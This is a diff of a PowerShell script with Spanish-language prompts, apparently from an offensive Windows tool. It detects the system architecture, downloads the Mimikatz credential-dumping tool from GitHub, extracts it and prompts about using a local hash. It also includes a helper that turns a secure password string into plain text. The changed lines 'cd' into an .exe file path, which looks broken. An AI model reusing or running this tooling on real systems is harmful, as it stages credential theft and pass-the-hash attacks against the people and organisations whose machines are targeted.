@@ -32,7 +32,6 @@ function Show-Menu {
 
 Set-StrictMode -Version Latest
 function ConvertFrom-SecureToPlain {
-    
     param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
     $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
     $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
@@ -81,9 +80,11 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 2500
         Write-Host ""
 	$version = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $version.trim()
-        if($system -in '32 bits','64 bits') { Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
+        Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
-	Expand-Archive .\mimikatz.zip } 
+	Expand-Archive .\mimikatz.zip
+	if($system -in '32 bits') { cd .\mimikatz\Win32\mimikatz.exe }
+	if($system -in '64 bits') { cd .\mimikatz\x64\mimikatz.exe }
         Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
